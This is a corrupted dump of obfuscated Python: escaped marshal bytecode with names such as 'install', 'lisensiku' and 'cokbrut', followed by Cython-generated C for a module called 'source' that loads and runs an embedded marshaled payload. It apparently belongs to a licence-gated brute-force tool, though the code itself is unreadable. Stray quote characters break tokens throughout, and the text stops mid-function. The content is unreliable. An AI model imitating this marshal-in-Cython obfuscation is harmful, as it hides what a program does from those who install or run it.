Z\\\\\\\\003a20Z\\\\\\\\003a21Z\\\\\\\\003a22Z\\\\\\\\003a23Z\\\\\\\\003a24Z\\\\\\\\003a25Z\\\\\\\\003a26Z\\\\\\\\003a27Z\\\\\\\\003a28Z\\\\\\\\003a29Z\\\\\\\\003a30Z\\\\\\\\003a31Z\\\\\\\\003a32Z\\\\\\\\003a33Z\\\\\\\\003a34Z\\\\\\\\003a35Z\\\\\\\\003a36Z\\\\\\\\003a37Z\\\\\\\\003a38Z\\\\\\\\003a39Z\\\\\\\\003a40r\\\\\\\\312\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\006cfontsr\\\\\\\\027\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\030\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\342\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\251\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\331\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\307\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\\\\\\\\\\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\007install\\\\\\\\332\\\\\\\\003CONZ\\\\\\\\005aBOIRrW\\\\\\\\001\\\\\\\\000\\\\\\\\000rV\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\262\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\037\\\\\\\\001\\\\\\\\000\\\\\\\\000rU\\\\\\\\001\\\\\\\\000\\\\\\\\000r1\\\\\\\\001\\\\\\\\000\\\\\\\\000r2\\\\\\\\001\\\\\\\\000\\\\\\\\000rZ\\\\\\\\001\\\\\\\\000\\\\\\\\000rY\\\\\\\\001\\\\\\\\000""\\\\\\\\000r\\\\\\\\\\\\\\\"\\\\\\\\001\\\\\\\\000\\\\\\\\000Z\\\\\\\\tlisensikur#\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\267\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\016\\\\\\\\001\\\\\\\\000\\\\\\\\000Z\\\\\\\\013lisensikuniZ\\\\\\\\007cokbrutr$\\\\\\\\001\\\\\\\\000\\\\\\\\000r'\\\\\\\\001\\\\\\\\000\\\\\\\\000rn\\\\\\\\001\\\\\\\\000\\\\\\\\000rq\\\\\\\\001\\\\\\\\000\\\\\\\\000ro\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001K\\\\\\\\332\\\\\\\\001Urg\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\001NZ\\\\\\\\003sirr\\\\\\\\343\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\325\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\326\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\327\\\\\\\\000\\\\\\\\000\\\\\\\\000rT\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\240\\\\\\\\000\\\\\\\\000\\\\\\\\000rS\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\330\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\341\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\324\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\345\\\\\\\\000\\\\\\\\000\\\\\\\\000Z\\\\\\\\003dicZ\\\\\\\\004dic2\\\\\\\\332\\\\\\\\003day\\\"\\\"Z\\\\\\\\003tglr\\\\\\\\335\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\005monthZ\\\\\\\\003bln\\\\\\\\332\\\\\\\\004yearZ\\\\\\\\003thnr_\\\\\\\\001\\\\\\\\000\\\\\\\\000r[\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\244\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\034\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\250\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\252\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\247\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\300\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\350\\\\\\\\000\\\\\\\\000\\\\\\\\000r\"\"\\\\\\\\276\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\360\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\356\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\007\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\355\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\366\\\\\\\\000\\\\\\\\000\\\\\\\\000r(\\\\\\\\001\\\\\\\\000\\\\\\\\000r0\\\\\\\\001\\\\\\\\000\\\\\\\\000r`\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332""\\\\\\\\010__name__\\\\\\\\332\\\\\\\\005mkdirr\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\010<module>\\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\000s \\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\004\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\005\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\"\\\\\\\"\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\nnn\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\006\\\\\\\\001\\\\\\\\010\\\\\\\\000a\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\010\\\\\\\\000n\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\010\\\\\\\\000n\\\\\\\\002\\\\\\\\377\\\\\\\\004\\\\\\\\002\\\\\\\\010\\\\\\\\016\\\\\\\\002\\\\\\\\001""\\\\\\\\030\\\\\\\\377\\\\\\\\036\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\nr\\\\\\\\014\\\\\\\\001\\\\\\\\024\\\\\\\\001\\\\\\\\014\\\\\\\\001(\\\\\\\\001(\\\\\\\\003\\\\\\\\010\\\\\\\\007\\\\\\\\010\\\\\\\\004\\\\\\\\010\\\\\\\\004\\\\\\\\010\\\\\\\\005\\\\\\\\010\\\\\\\\032\\\\\\\\0100\\\\\\\\010\\\\\\\\t\\\\\\\\010=\\\\\\\\010\\\\\\\\006\\\\\\\\010\\\\\\\\024\\\\\\\\010q\\\\\\\\010G\\\\\\\\010<\\\\\\\\010\\\\\\\\000\\\\\\\\003\\\\\\\\010\\\\\\\\000\\\\\\\\000\\\\\\\\n\\\\\\\\010\\\\\\\\013\\\\\\\\010\\\\\\\\\\\\\\\"\\\\\\\\nnstatic PyObject *__pyx_kp_u_;\\\\nstatic PyObject *__pyx_kp_u_3_9;\\\\nstatic PyObject *__pyx_kp_u_No_support_for_VALUE;\\\\nstatic PyObject *__pyx_n_s_PYTHON_VERSION;\\\\nstatic PyObject *__pyx_kp_u_VERSION;\\\\nstatic PyObject *__pyx_kp_u__2;\\\\nstatic PyObject *__pyx_n_s_builtins;\\\\nstatic PyObject *__pyx_kp_b_c_sb_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l;\\\\nstatic PyObject *__pyx_n_s_cline_in_traceback;\\\\nstatic PyObject *__pyx_n_s_exit;\\\\nstatic PyObject *__pyx_n_s_import;\\\\nstatic PyObject *__pyx_n_s_loads;\\\\nstatic PyObject *__pyx_n_s_main;\\\\nstatic PyObject *__pyx_n_s_marshal;\\\\nstatic PyObject *__pyx_n_s_name;\\\\nstatic PyObject *__pyx_n_s_print;\\\\nstatic PyObject *__pyx_n_s_split;\\\\nstatic PyObject *__pyx_n_s_sys;\\\\nstatic PyObject *__pyx_n_s_test;\\\\nstatic PyObject \\\"\\\"*__pyx_n_s_version;\\\\nstatic PyObject *__pyx_int_0;\\\\nstatic PyObject *__pyx_int_neg_1;\\\\nstatic PyObject *__pyx_slice__5;\\\\nstatic PyObject *__pyx_tuple__3;\\\\nstatic PyObject *__pyx_tuple__4;\\\\nstatic PyObject *__pyx_tuple__6;\\\\nstatic PyObject *__pyx_tuple__7;\\\\n/* Late includes */\\\\n\\\\nstatic PyMethodDef __pyx_methods[] = {\\\\n  {0, 0, 0, 0}\\\\n};\\\\n\\\\n#if PY_MAJOR_VERSION >= 3\\\\n#if CYTHON_PEP489_MULTI_PHASE_INIT\\\\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/\\\\nstatic int __pyx_pymod_exec_source(PyObject* module); /*proto*/\\\\nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\\\\n  {Py_mod_create, (void*)__pyx_pymod_create},\\\\n  {Py_mod_exec, (void*)__pyx_pymod_exec_source},\\\\n  {0, NULL}\\\\n};\\\\n#endif\\\\n\\\\nstatic struct PyModuleDef __pyx_moduledef = {\\\\n    PyModuleDef_HEAD_INIT,\\\\n    \\\\\\\"source\\\\\\\",\\\\n    0, /* m_doc */\\\\n  #if CYTHON_PEP489_MULT""I_PHASE_INIT\\\\n    0, /* m_size */\\\\n  #else\\\\n    -1, /* m_size */\\\\n  #endif\\\\n    __pyx_methods /* m_methods */,\\\\n  #if CYTHON_\"\"PEP489_MULTI_PHASE_INIT\\\\n    __pyx_moduledef_slots, /* m_slots */\\\\n  #else\\\\n    NULL, /* m_reload */\\\\n  #endif\\\\n    NULL, /* m_traverse */\\\\n    NULL, /* m_clear */\\\\n    NULL /* m_free */\\\\n};\\\\n#endif\\\\n#ifndef CYTHON_SMALL_CODE\\\\n#if defined(__clang__)\\\\n    #define CYTHON_SMALL_CODE\\\\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\\\\n    #define CYTHON_SMALL_CODE __attribute__((cold))\\\\n#else\\\\n    #define CYTHON_SMALL_CODE\\\\n#endif\\\\n#endif\\\\n\\\\nstatic __Pyx_StringTabEntry __pyx_string_tab[] = {\\\\n  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},\\\\n  {&__pyx_kp_u_3_9, __pyx_k_3_9, sizeof(__pyx_k_3_9), 0, 1, 0, 0},\\\\n  {&__pyx_kp_u_No_support_for_VALUE, __pyx_k_No_support_for_VALUE, sizeof(__pyx_k_No_support_for_VALUE), 0, 1, 0, 0},\\\\n  {&__pyx_n_s_PYTHON_VERSION, __pyx_k_PYTHON_VERSION, sizeof(__pyx_k_PYTHON_VERSION), 0, 0, 1, 1},\\\\n  {&__pyx_kp_u_VERSION, __pyx_k_VERSION, sizeof(__pyx_k_VERSION), 0, 1, 0, 0},\\\\n  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1,\\\"\\\" 0, 0},\\\\n  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},\\\\n  {&__pyx_kp_b_c_sb_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l, __pyx_k_c_sb_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l, sizeof(__pyx_k_c_sb_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l), 0, 0, 0, 0},\\\\n  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},\\\\n  {&""__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},\\\\n  {&__\"\"pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},\\\\n  {&__pyx_n_s_version, __pyx_k_version, sizeof(__pyx_k_version), 0, 0, 1, 1},\\\\n  {0, 0, 0, 0, 0, 0, 0}\\\\n};\\\\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {\\\\n  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 10, __pyx_L1_error)\\\\n  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 12, __pyx_L1_error)\\\\n  return 0;\\\\n  __pyx_L1_error:;\\\\n  return -1;\\\\n}\\\\n\\\\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_InitCachedConstants\\\\\\\", 0);\\\\n\\\\n  \\\\n  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_kp_u__2); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_tuple__3);\\\\n  __Pyx_GIVEREF(__pyx_tuple__3);\\\\n  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_kp_u_); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 8, __pyx_L1_err\\\"\\\"or)\\\\n  __Pyx_GOTREF(__pyx_tuple__4);\\\\n  __Pyx_GIVEREF(__pyx_tuple__4);\\\\n  __pyx_slice__5 = PySlice_New(Py_None, __pyx_int_neg_1, Py_None); if (unlikely(!__pyx_slice__5)) __PYX_ERR(0, 8, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_slice__5);\\\\n  __Pyx_GIVEREF(__pyx_slice__5);\\\\n\\\\n  \\\\n  __pyx_tuple__6 = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 12, __pyx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_tuple__6);\\\\n  __Pyx_GIVEREF(__pyx_tuple__6);\\\\n\\\\n  \\\\n  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_b_c_sb_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 14, __p""yx_L1_error)\\\\n  __Pyx_GOTREF(__pyx_tuple__7);\\\\n  __Pyx_GIVEREF(__pyx_tuple__7);\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n  __pyx_L1_error:;\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return -1;\\\\n}\\\\n\\\\nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {\\\\n  if (__Pyx_InitStrings(__pyx_string_tab) <\"\" 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __pyx_int_neg_1 = PyInt_FromLong(-1); if (unlikely(!__pyx_int_neg_1)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  return 0;\\\\n  __pyx_L1_error:;\\\\n  return -1;\\\\n}\\\\n\\\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/\\\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/\\\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/\\\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/\\\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/\\\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/\\\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/\\\\n\\\\nstatic int __Pyx_modinit_global_init_code(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_modinit_global_init_code\\\\\\\", 0);\\\\n  /*--- Global init code ---*/\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n}\\\\n\\\\nstatic int __Pyx_m\\\"\\\"odinit_variable_export_code(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_modinit_variable_export_code\\\\\\\", 0);\\\\n  /*--- Variable export code ---*/\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n}\\\\n\\\\nstatic int __Pyx_modinit_function_export_code(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_modinit_function_export_code\\\\\\\", 0);\\\\n  /*--- Function expo""rt code ---*/\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n}\\\\n\\\\nstatic int __Pyx_modinit_type_init_code(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_modinit_type_init_code\\\\\\\", 0);\\\\n  /*--- Type init code ---*/\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n}\\\\n\\\\nstatic int __Pyx_modinit_type_import_code(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_\"\"modinit_type_import_code\\\\\\\", 0);\\\\n  /*--- Type import code ---*/\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n}\\\\n\\\\nstatic int __Pyx_modinit_variable_import_code(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_modinit_variable_import_code\\\\\\\", 0);\\\\n  /*--- Variable import code ---*/\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n}\\\\n\\\\nstatic int __Pyx_modinit_function_import_code(void) {\\\\n  __Pyx_RefNannyDeclarations\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_modinit_function_import_code\\\\\\\", 0);\\\\n  /*--- Function import code ---*/\\\\n  __Pyx_RefNannyFinishContext();\\\\n  return 0;\\\\n}\\\\n\\\\n\\\\n#ifndef CYTHON_NO_PYINIT_EXPORT\\\\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\\\\n#elif PY_MAJOR_VERSION < 3\\\\n#ifdef __cplusplus\\\\n#define __Pyx_PyMODINIT_FUNC extern \\\\\\\"C\\\\\\\" void\\\\n#else\\\\n#define __Pyx_PyMODINIT_FUNC void\\\\n#endif\\\\n#else\\\\n#ifdef __cplusplus\\\\n#define __Pyx_PyMODINIT_FUNC extern \\\\\\\"C\\\\\\\" PyObject *\\\\n#else\\\\n#define __Pyx_PyMODINIT_FUNC PyObject *\\\\n#endif\\\\n#endif\\\\n\\\\n\\\\n#if PY_MAJOR_VERSION < 3\\\\n__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/\\\\n__Pyx_PyMODINIT_FUNC initsource(void)\\\\n#else\\\\n__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMA\\\"\\\"LL_CODE; /*proto*/\\\\n__Pyx_PyMODINIT_FUNC PyInit_source(void)\\\\n#if CYTHON_PEP489_MULTI_PHASE_INIT\\\\n{\\\\n  return PyModuleDef_Init(&__pyx_mo""duledef);\\\\n}\\\\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\\\\n    #if PY_VERSION_HEX >= 0x030700A1\\\\n    static PY_INT64_T main_interpreter_id = -1;\\\\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\\\\n    if (main_interpreter_id == -1) {\\\\n        main_interpreter_id = current_id;\\\\n        return (unlikely(current_id == -1)) ? -1 : 0;\\\\n    } else if (unlikely(main_interpreter_id != current_id))\\\\n    #else\\\\n    static PyInterpreterState *main_interpreter = NULL;\\\\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\\\\n    if (!\"\"main_interpreter) {\\\\n        main_interpreter = current_interpreter;\\\\n    } else if (unlikely(main_interpreter != current_interpreter))\\\\n    #endif\\\\n    {\\\\n        PyErr_SetString(\\\\n            PyExc_ImportError,\\\\n            \\\\\\\"Interpreter change detected - this module can only be loaded into one interpreter per process.\\\\\\\");\\\\n        return -1;\\\\n    }\\\\n    return 0;\\\\n}\\\\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {\\\\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\\\\n    int result = 0;\\\\n    if (likely(value)) {\\\\n        if (allow_none || value != Py_None) {\\\\n            result = PyDict_SetItemString(moddict, to_name, value);\\\\n        }\\\\n        Py_DECREF(value);\\\\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\\\\n        PyErr_Clear();\\\\n    } else {\\\\n        result = -1;\\\\n    }\\\\n    return result;\\\\n}\\\\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {\\\\n    PyObject *module = NULL, *moddict, *modname;\\\\n    if (__Pyx_check_single_interpreter())\\\\n        return NULL;\\\\n    if (__pyx_m)\\\\n        return __Pyx_NewRef(__pyx_m);\\\\n    modname = PyObje""ct_GetAttrString(s\\\"\\\"pec, \\\\\\\"name\\\\\\\");\\\\n    if (unlikely(!modname)) goto bad;\\\\n    module = PyModule_NewObject(modname);\\\\n    Py_DECREF(modname);\\\\n    if (unlikely(!module)) goto bad;\\\\n    moddict = PyModule_GetDict(module);\\\\n    if (unlikely(!moddict)) goto bad;\\\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\\\\\"loader\\\\\\\", \\\\\\\"__loader__\\\\\\\", 1) < 0)) goto bad;\\\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\\\\\"origin\\\\\\\", \\\\\\\"__file__\\\\\\\", 1) < 0)) goto bad;\\\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\\\\\"parent\\\\\\\", \\\\\\\"__package__\\\\\\\", 1) < 0)) goto bad;\\\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\\\\\"submodule_search_locations\\\\\\\", \\\\\\\"__pa\"\"th__\\\\\\\", 0) < 0)) goto bad;\\\\n    return module;\\\\nbad:\\\\n    Py_XDECREF(module);\\\\n    return NULL;\\\\n}\\\\n\\\\n\\\\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)\\\\n#endif\\\\n#endif\\\\n{\\\\n  PyObject *__pyx_t_1 = NULL;\\\\n  PyObject *__pyx_t_2 = NULL;\\\\n  int __pyx_t_3;\\\\n  int __pyx_lineno = 0;\\\\n  const char *__pyx_filename = NULL;\\\\n  int __pyx_clineno = 0;\\\\n  __Pyx_RefNannyDeclarations\\\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\\\n  if (__pyx_m) {\\\\n    if (__pyx_m == __pyx_pyinit_module) return 0;\\\\n    PyErr_SetString(PyExc_RuntimeError, \\\\\\\"Module 'source' has already been imported. Re-initialisation is not supported.\\\\\\\");\\\\n    return -1;\\\\n  }\\\\n  #elif PY_MAJOR_VERSION >= 3\\\\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\\\\n  #endif\\\\n  #if CYTHON_REFNANNY\\\\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI(\\\\\\\"refnanny\\\\\\\");\\\\nif (!__Pyx_RefNanny) {\\\\n  PyErr_Clear();\\\\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI(\\\\\\\"Cython.Runtime.refnanny\\\\\\\");\\\\n  if (!__Pyx_RefNanny)\\\\n      Py_FatalError(\\\\\\\"failed to import 'refnanny' module""\\\\\\\");\\\\n}\\\\n#endif\\\\n  __Pyx_RefNannySetupContext(\\\\\\\"__Pyx_PyMODINIT_FUNC PyInit_source(void)\\\\\\\", 0);\\\\n  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\\\\n  __Pxy_PyFrame_Initialize_Offsets();\\\\n  #endif\\\\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_e\\\"\\\"mpty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __pyx_empty_bytes = PyBytes_FromStringAndSize(\\\\\\\"\\\\\\\", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize(\\\\\\\"\\\\\\\", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #ifdef __Pyx_CyFunction_USED\\\\n  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  #ifdef __Pyx_FusedFunction_USED\\\\n  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  #ifdef __Pyx_Coroutine_USED\\\\n  if (__py\"\"x_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  #ifdef __Pyx_Generator_USED\\\\n  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  #ifdef __Pyx_AsyncGen_USED\\\\n  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  #ifdef __Pyx_StopAsyncIteration_USED\\\\n  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  /*--- Library function declarations ---*/\\\\n  /*--- Threads initialization code ---*/\\\\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\\\\n  PyEval_InitThreads();\\\\n  #endif\\\\n  /*--- Module creation code ---*/\\\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\\\n  __pyx_m = __pyx_pyinit_module;\\\\n  Py_INCREF(__pyx_m);\\\\n  #else\\\\n  #if PY_MAJOR_VERSION < 3\\\\n  __pyx_m = Py_InitModule4(\\\\\\\"source\\\\\\\", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);""\\\\n  #else\\\\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\\\\n  #endif\\\\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)\\\\n  #endif\\\\n  